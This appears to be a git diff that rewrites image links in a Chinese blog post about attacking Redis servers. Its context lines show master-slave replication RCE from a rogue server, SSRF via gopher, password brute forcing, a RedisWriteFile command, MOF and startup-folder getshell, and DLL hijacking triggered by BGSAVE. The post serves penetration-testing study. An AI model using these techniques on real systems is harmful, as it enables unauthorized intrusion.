@@ -110,13 +110,13 @@ OK
 12345678
 ```
 
-![img](https://i-blog.csdnimg.cn/blog_migrate/ed1fd1e61bf4b421fc327539a168b618.png)
+![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4ba611685212c308709dbcb8d54c007a.png)
 
 回到win10上看一下会发现写入成功，只是多了一些杂数据， 但并不会影响我们马儿的运行：
 
-![img](https://i-blog.csdnimg.cn/blog_migrate/4c18415c68b26f38fdf4e2c42d84b6c7.png)
+![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/df5a8d62c60529ebf8a3222a5113c679.png)
 
-![img](https://i-blog.csdnimg.cn/blog_migrate/dc7582a8be52a337343a1badba28911e.png)
+![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/5e6ee3233069987394c82e591bbe81b1.png)
 
 phpinfo依旧执行成功。
 
@@ -186,7 +186,7 @@ system.exec "id"
 12
 ```
 
-![img](https://i-blog.csdnimg.cn/blog_migrate/6049664b63c16146521ff640b3237472.png)
+![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/256f41130340fed13c4c0be47166773a.png)
 
 漏洞利用成功，此时可以执行任意命令。
 
@@ -247,7 +247,7 @@ PING
 
 那么我们如果向其回复+OK，就会收到如下：
 
-![img](https://i-blog.csdnimg.cn/blog_migrate/ffd147f6d26dff077ad26d81c8d431a3.png)
+![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/869059b68c3e878f7c29a31568c7c0a7.png)
 
 会发现我们事实上是可以模拟其服务端构建一个恶意服务端将我们的so文件通过主从复制同步到目标机器中达成rce。
 
@@ -260,11 +260,11 @@ PING
 
 执行恶意端后显示如下：
 
-![img](https://i-blog.csdnimg.cn/blog_migrate/e6bb6f3c56c4ac5647c5bff238c30180.png)
+![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/bce6c57d44c7e62f07749ec4ae504203.png)
 
 此时我们通过redis-cli连上目标机后可以通过 `system.exec "cmd"` 调用任意命令。
 
-![img](https://i-blog.csdnimg.cn/blog_migrate/d5f0276dd21b264ce0962cd82fb4ef38.png)
+![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/7def0240ffa521fa2a3dd63f134736ab.png)
 
 #### ssrf打redis
 
@@ -276,7 +276,7 @@ ssrf因为一个gopher协议大大拓宽了攻击面，使用过gopher的会知�
 
 wireshark抓一下本地包过滤一下端口即可拿到我们的redis发送的数据：
 
-![img](https://i-blog.csdnimg.cn/blog_migrate/e33b24a670ee29df97d37cf47744f33e.png)
+![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a0eafcd5ab40f2ca90fed7315d1420ea.png)
 
 关于这串东西可以简单了解一下：
 
@@ -356,11 +356,11 @@ print(result)
 
 我们将上面的串复制下来后编码发包，会得到如下：
 
-![img](https://i-blog.csdnimg.cn/blog_migrate/dfc9d5fca207b4e2c7910ebcffc0ce16.png)
+![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/8bf0b2e4525122b84daeee85b47fc5a8.png)
 
 然后如果尝试发送一个错误的密码会得到如下：
 
-![img](https://i-blog.csdnimg.cn/blog_migrate/9fcb5a0839fbd2a3fc93dfa123c935cc.png)
+![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/447a7d45868689c6837989e76886e5f4.png)
 
 有两个不同回显那么我们就可以对此进行脚本编写了，记得最后写入一个quit才能够断开连接，这里是采用curl爆破密码：
 
@@ -488,13 +488,13 @@ quit
 给出该工具的下载地址： [RedisWriteFile](https://github.com/r35tart/RedisWriteFile)  
 在我们的服务器中运行该脚本（目标Redis一定要能回连我们的服务器才行）：
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/46fce243daed8d9b1eac6a8dabacd9e2.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100513-23dc856e-b5bf-1.jpeg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/041d770b63561611ef9bd3175f91043f.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/041d770b63561611ef9bd3175f91043f.jpeg)
 
 Redis服务器中显示其被设置为slave，同步数据并写入文件：
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/c9576cc86f320a216f640044e65c010f.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100612-470819fe-b5bf-1.jpeg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/35018ea7959c8d62fef5bdaeabd66ee8.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/35018ea7959c8d62fef5bdaeabd66ee8.jpeg)
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/5b03c264188a9be2011db3cda608f278.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100620-4c2fe286-b5bf-1.jpeg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ca9cac2f683ec331c24c0c452508f341.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ca9cac2f683ec331c24c0c452508f341.jpeg)
 
 ### 0x02 getshell
 
@@ -513,17 +513,17 @@ startup的绝对路径如下：
 虽然想知道用户名并不容易，但把常用的用户名挨个跑一遍，万一就成功了呢？  
 如果目录不存在，写操作会失败，报错信息如下：
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/de47408ef6e957c365a9a948d4f4b92b.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100656-6177b3bc-b5bf-1.jpeg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/692ba584e435a5e557348b1153c077fc.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/692ba584e435a5e557348b1153c077fc.jpeg)
 
 若目录存在，但没有权限写入，报错信息如下：
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/4bff97ac0f4f4ba5c0d330db74b24eaa.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100710-69fd5384-b5bf-1.jpeg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/42fae95fdef1b61ea6082e9dd4c97601.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/42fae95fdef1b61ea6082e9dd4c97601.jpeg)
 
 若目录存在，且写文件成功，如下：
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/3a90d5326ee601bfb41880eaa3c1cd93.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100920-b733f93c-b5bf-1.jpeg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/cbe70b772bba918ecbcefab209ad76f9.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/cbe70b772bba918ecbcefab209ad76f9.jpeg)
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/db0933353238c8561db7928e070c1f4b.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624100941-c3e1396a-b5bf-1.jpeg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/54b726c72bb243297a5814d3c148d478.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/54b726c72bb243297a5814d3c148d478.jpeg)
 
 这里其实是在赌一件事情：管理员将Redis添加了服务项并配了一个高权限（如Administrator甚至SYSTEM），这样的话默认账户的路径就一定可写了。  
 当然，启动项写进去了，还要让主机重启才可以生效，如果没有BDoS类的漏洞也就只能被动等待，这是比较尴尬的。
@@ -547,10 +547,10 @@ startup的绝对路径如下：
 比较通用的方法是向system32目录下写文件，但NT6及以上操作系统的UAC必须关掉，或Redis以SYSTEM权限启动，否则脚本显示成功但实际上是无法写入的。  
 关掉UAC后，测试证明普通管理员可成功写入：
 
-\[![img](https://i-blog.csdnimg.cn/blog_migrate/081432aea6f0a88bfcc96fe14974dbef.jpeg)
+\[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/7db161d03f71f0ffb7faf627bbf23dfe.jpeg)
 
 但经过测试这种方法确实有写入的可能，但并不能覆盖原来的文件，还是非常被动。倒不如写个快捷方式马（当然前提还是知道用户名，不然效果也不好）：  
-![img](https://i-blog.csdnimg.cn/blog_migrate/15b9ebc85a6160dabcc5b8c214aea2da.jpeg) ![img](https://i-blog.csdnimg.cn/blog_migrate/9ac3b62be89b54637caf3416a82a862b.jpeg)
+![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/0251899f1fb22b69a6a192bc06de3115.jpeg) ![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/1989a26ac1690724a2fa562e8539dc19.jpeg)
 
 #### 4.mof
 
@@ -590,11 +590,11 @@ instance of __FilterToConsumerBinding
 将其保存为nullevt.mof并写入C:/windows/system32/wbem/mof路径下，而且由于03没有默认UAC的控制，只要权限够就可以直接写入。  
 写入后几秒钟脚本就会执行，执行成功会放在good文件夹，失败放在bad文件夹。：
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/0a89e515be78b771e68154d13396fdbf.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624101146-0e4efd52-b5c0-1.jpeg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/d4ef7be43ad31353851c5b39a5e8fc35.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/d4ef7be43ad31353851c5b39a5e8fc35.jpeg)
 
 再看DNSlog，收到请求：
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/2d4cfa2c3d4cb6a839e4850959035914.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200624101204-18de7ad6-b5c0-1.jpeg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/b22f5fa58c1845dca622e8ee6735acbb.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/b22f5fa58c1845dca622e8ee6735acbb.jpeg)
 
 ### 0x03 总结
 
@@ -610,7 +610,7 @@ DLL劫持相关技术已经存在很久了，现在依然可以运用到权限�
 
 有师傅可能会想，不是有主从复制RCE的姿势嘛？需要这么麻烦吗？  
 是因为主从复制后的 关键功能 `MODULE LOAD` 在4.0.0 之后开始支持，而我从github上找到的Windows版本最新也仅为:  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/c31326bbfe58970b64c08751bcc5f34d.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135852-1090e120-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/fb1ae319229e45ad77d1619c59e43fb2.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/fb1ae319229e45ad77d1619c59e43fb2.jpeg)
 
 ### 过程
 
@@ -629,7 +629,7 @@ DLL劫持相关技术已经存在很久了，现在依然可以运用到权限�
 
 通过常规操作，dbfilename 写文件，的确可以正常将asp写进去，但是因为 Windows Server 2012 安装IIS的时候，并不会主动帮助你勾选 ASP / ASP.NET 运行环境，所以即使能写ASP马，也不能解析。
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/2006d96cb0237b566c03370b4816b112.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135853-11013290-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e825fa6fc7844f004007baddc6587a75.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e825fa6fc7844f004007baddc6587a75.jpeg)
 
 #### 3389 旁路攻击
 
@@ -642,12 +642,12 @@ DLL劫持相关技术已经存在很久了，现在依然可以运用到权限�
 本着试试的心态，我搭建了相同的环境,使用 `Procmon` 进行分析。
 
 > 多说一句，如果遇到以下错误，可以下载 [KB3033929](https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148) 进行安装。  
-> [![img](https://i-blog.csdnimg.cn/blog_migrate/d428e8f451bd27df0b4437b963958f0d.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135853-114b14be-dd2a-1.jpg)
+> [![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/318873a83df44328efae6c9d7374ceca.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/318873a83df44328efae6c9d7374ceca.jpeg)
 
 为了保险起见，我们设置比较宽松的 Filter,只显示 Path end with为 dll的结果。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/1218f1561fa8e372911983206e9cae98.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135854-1189a896-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a8bbc749c51c9e5b334dbf9099267a33.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a8bbc749c51c9e5b334dbf9099267a33.jpeg)
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/3394879a4fad5d52323dc246eaf73a96.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135854-11f13b28-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/0fe2c06230a52900242efb11f1c00cd8.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/0fe2c06230a52900242efb11f1c00cd8.jpeg)
 
 在发起RDP连接的过程中，我的确发现了 在 `Windows Server 2012` 中存在 mstlsapi DLL NAME NOT FOUND 的结果。
 
@@ -667,7 +667,7 @@ Cyber Security Awareness Month - Day 9 - Port 3389/tcp (RDP)](https://isc.sans.e
 劫持的方式也有很多，之前试过BDF DLL注入，考虑到x64 dll还存在较多问题，所以为了快速达到效果，这里我们使用 kiwings师傅所改的 [DLLHijacker](https://github.com/kiwings/DLLHijacker) 帮助我们生成劫持DLL后的工程项目，以便我们可以自由的修改 `Shellcode` 劫持该DLL,此方法利用函数转发完成，不会破坏原有功能（在测试中发现如果转发失败会直接导致无法关机等各种情况），缺点就是他需要原DLL也同时存在操作系统上。
 
 > 图来自 [https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/](https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/)  
-> [![img](https://i-blog.csdnimg.cn/blog_migrate/40a5d9245e097c864cec2fcde95b3998.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135855-123664a0-dd2a-1.jpg)
+> [![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/b7f7bffe8700a1d05500951232fe9f96.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/b7f7bffe8700a1d05500951232fe9f96.jpeg)
 
 在使用过程中，原本脚本生成后VS中有乱码问题，所以改一下，我们最好将文件以 `wb` 模式存储。  
 
@@ -691,13 +691,13 @@ successfully generated a DLLHijack Project of mstlsapi
 ```
 
 脚本会帮助我们转发所有的导出函数，你可以使用 `CFF Explorer` 进一步确认.  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/a643ee171d0b62d9b02dd6b0186b3b75.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135856-12cebfa2-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/5642cd29987f0ea6c1b722614abbf387.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/5642cd29987f0ea6c1b722614abbf387.jpeg)
 
 打开项目基本不需要做什么改动，做实验可以使用默认的 `Calc shellcode` 即可。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/a416fa073ce7f8a4ac47cc151e482318.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135856-133f1b9e-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/0711b364fb8b821ccd19cde721d9fdde.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/0711b364fb8b821ccd19cde721d9fdde.jpeg)
 
 唯一需要做的就是指定一下原dll的绝对路径，这个路径将是我们等会利用主从复制写文件原始DLL存放路径。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/be98f0aefe8fe413f06f57e3cdfcb669.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135857-13850e56-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/75cb8c88d89f4dd18776e1c053c7a6d7.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/75cb8c88d89f4dd18776e1c053c7a6d7.jpeg)
 
 接下去利用 [RedisWriteFile](https://github.com/r35tart/RedisWriteFile) 写文件即可，先将 `mstlsapi.dll` 放入指定路径。
 
@@ -706,7 +706,7 @@ python3 RedisWriteFile.py --rhost=192.168.56.140 --rport=6379 --lhost=192.168.56
 1
 ```
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/97aff6a85096c69a095693f5b17503cd.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135857-13bb1096-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/d5dc2939b489da2521f352a7b324ff4e.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/d5dc2939b489da2521f352a7b324ff4e.jpeg)
 
 确保文件无损写入。
 
@@ -728,16 +728,16 @@ python3 RedisWriteFile.py --rhost=192.168.56.140 --rport=6379 --lhost=192.168.56
 1
 ```
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/d4c37a7dfad143635d470dfe0fe382dc.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135858-13f71190-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4f981a1cf8482ce41c01de2420281b78.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4f981a1cf8482ce41c01de2420281b78.jpeg)
 
 这里需要注意，因为连接是调用是 `NETWORK SERVICE` 权限的svchost 所以 `calc` 并不会在当前用户桌面弹出。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/e092d8fa3db3991a5b78e589b525eef6.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135858-1451b654-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/69e32bc0179d004c60dc86491449fc5d.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/69e32bc0179d004c60dc86491449fc5d.jpeg)
 
 接下去连接，发现的确触发了计算器的调用。
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/429b36dcfcc8012783226ca709b2fe12.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135859-14df1e86-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/8d2acede64c606cdd335d6513a2b9a26.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/8d2acede64c606cdd335d6513a2b9a26.jpeg)
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/aec4dc9189200520ed13726596a09e0d.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135900-152c2dca-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ab25cd912b6b5feab2bee62e5743679b.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ab25cd912b6b5feab2bee62e5743679b.jpeg)
 
 从调用情况，可以看出 `C:\Windows\mstlsapi.dll` 是加载成功了。
 
@@ -760,21 +760,21 @@ code();
 借助其他服务来进行利用，相对来说还是比较被动，所以后续我主要去关注了redis本身，会不会在某些情况存在Dll劫持的问题。还有一点，高权限启动redis的情况有，但是最好还是能在低权限下能做一些事情。
 
 所以我将环境默认安装， `Redis Service` 会开机自启，权限为 `Network Service` 。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/43a9bbf5f01313ac77c4d31e9ecab5c7.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135900-159b9afc-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e81d0e5c904c840b66ce8cd5d32b7617.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e81d0e5c904c840b66ce8cd5d32b7617.jpeg)
 
 那么单纯的 Redis shell 能做的并不多，我们可以尝试使用一些命令来观察执行过程。
 
 命令比较多，所以我们主要关注 Server端的指令。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/fb66ea57a81a5fca3415ab5382526ecc.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135901-15ec811a-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4cb2f81722af72ccb8977364d90e6d86.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4cb2f81722af72ccb8977364d90e6d86.jpeg)
 
 在测试的过程中，我发现在使用 SYNC 命令时，发生了DLL 劫持的特征。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/c35a20d37e6096ea20e78c7347fae449.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135901-16152444-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/5368facf5f7aaa90ae9bd9a75fe74e49.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/5368facf5f7aaa90ae9bd9a75fe74e49.jpeg)
 
 可以发现，不止出现了一个DLL 未找到。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/93baf899a3fa1092a0978b1159ce1826.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135902-1649f76e-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ae0f669e7f06d4b7adb4443fc3743904.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ae0f669e7f06d4b7adb4443fc3743904.jpeg)
 
 放宽限制我们来细看一下。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/07fec9f64b6c095577e8000c34c196b7.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135902-1686d67a-dd2a-1.jpg)  
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/7233c41014b834ed9c43bfa17c2e9e60.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/7233c41014b834ed9c43bfa17c2e9e60.jpeg)  
 这里可以发现系统其实还去查询了 SafeDllSearchMode key值，但是因为从 Windows 7之后就采用KnownDLLs机制所以提示这个键值也是找不到的，但是并不影响DLL查找顺序。
 
 1. 进程对应的应用程序所在目录（可理解为程序安装目录比如 `C:\ProgramFile\xxx` ）；
@@ -787,25 +787,25 @@ code();
 所以根据规则， `dbghelp.dll` 不在 `KnownDLLs List` 中，会先从安装目录下搜索，即使System32下已经存在了 `dbghelp.dll` 。
 
 另外一个很幸运的事情是，默认的安装目录， `Network Service` 用户是拥有完全控制权限的。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/5a32652bff6aca953a25bfad288e7b88.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135903-16dc0b40-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/09caaebf27143d87c5ae2effe5eb8350.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/09caaebf27143d87c5ae2effe5eb8350.jpeg)
 
 在利用的时候安装目录如何得知了？其实通过 info 就可以看到。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/3be612e6fa3756b69067acec970c849d.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135903-1725b844-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/6d004b078125bbc232dd87ff7b141edf.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/6d004b078125bbc232dd87ff7b141edf.jpeg)
 
 因为权限问题，这里我们就不考虑 `symsrv.dll`,因为他是需要在 System32 目录下进行劫持，接下去我们来看看 SYNC 命令。
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/dbb363bbf3cadb2a706b429a3c29c30e.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135903-17545622-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/31823bf86ff88c75bccceba0b391a07a.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/31823bf86ff88c75bccceba0b391a07a.jpeg)
 
 熟悉主从复制的同学对 SYNC 命令并不会陌生，它主要是让从服务器同步 Master的数据，在2.8版本之后加入PSYNC 为了代替SYNC，场景是为了解决断线重连之后的全量复制低效的缺陷，同样PYSNC也是会产生 `NAME NOT FOUNT` 。
 
 > 图来自 https://juejin.im/post/6844903943764443149#heading-1  
-> [![img](https://i-blog.csdnimg.cn/blog_migrate/0218dc96ea4a37dce7569970c7790615.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135904-17824fdc-dd2a-1.jpg)
+> [![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/31b2fc9e47a01c7afc7cd2a019053351.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/31b2fc9e47a01c7afc7cd2a019053351.jpeg)
 
 从同步流程图可以看出来，slaveof host port 命令之后，其实就会去直接执行 sync的操作，并且SYNC之后还会开始执行BGSAVE的指令，并会fork一个子进程，然后创建RDB文件（一个压缩过的二进制文件，可以通过该文件还原快照时的数据库状态）进行持久化。
 
 于是我尝试直接执行 `BGSAVE` 命令，发现也是直接触发了 `NAME NOT FOUNT` 。
 
-[![img](https://i-blog.csdnimg.cn/blog_migrate/cfa4031f46d055796588aa65323c1597.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135904-17aefdac-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/23d63d36dca99b45cadc7c1b7254b46f.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/23d63d36dca99b45cadc7c1b7254b46f.jpeg)
 
 后来发现与之相关的 `BGREWRITEAOF` 命令也会有同样的效果，其实可能还会有更多的命令会有这种效果，但并没有全部测试。有了刚才利用3389进行劫持的基础，现在来利用这个应该就比较简单了。
 
@@ -816,12 +816,12 @@ code();
 3. 连接redis, 执行bgsave。
 
 可以看到执行了两次，并产生两个 calc 进程，这样就不需要被动等待DLL劫持带来的效果啦。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/1345262ab647c51d29c4e931dfbc61e5.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135905-184bfce2-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/57076ecee2de5e0ee1d71d25d1a7dcb2.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/57076ecee2de5e0ee1d71d25d1a7dcb2.jpeg)
 
 在重启服务后，会自动加载此DLL，自动伴随持久化效果。  
 
 文件已被加载，无法直接删除。  
-[![img](https://i-blog.csdnimg.cn/blog_migrate/8a4a5031a7bd732314090789071a61ff.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135905-18a0f2e2-dd2a-1.jpg)
+[![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/333c505baa4878e92927e8861d7e8cd3.jpeg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/333c505baa4878e92927e8861d7e8cd3.jpeg)
 
 #### 总结&防御
 
@@ -863,19 +863,19 @@ code();
 
 举报
 
- [![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/Group.png) 点击体验  
-DeepSeekR1满血版](https://ai.csdn.net/?utm_source=cknow_pc_blogdetail&spm=1001.2101.3001.10583) 隐藏侧栏 ![程序员都在用的中文IT技术交流社区](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_app.png)
+ [![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4b5d638b57b796bf4228e36a12fd3244.png) 点击体验  
+DeepSeekR1满血版](https://ai.csdn.net/?utm_source=cknow_pc_blogdetail&spm=1001.2101.3001.10583) 隐藏侧栏 ![程序员都在用的中文IT技术交流社区](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/6ddf638effe61d927f03a0789e73f41e.png)
 
 程序员都在用的中文IT技术交流社区
 
-![专业的中文 IT 技术社区，与千万技术人共成长](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_wechat.png)
+![专业的中文 IT 技术社区，与千万技术人共成长](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4832e9a5e9fe3a702f3d81b1ce7c9ca3.png)
 
 专业的中文 IT 技术社区，与千万技术人共成长
 
-![关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_video.png)
+![关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e311c5ce3170b9f4471a19010a5c3bd8.png)
 
 关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！
 
 客服 返回顶部
 
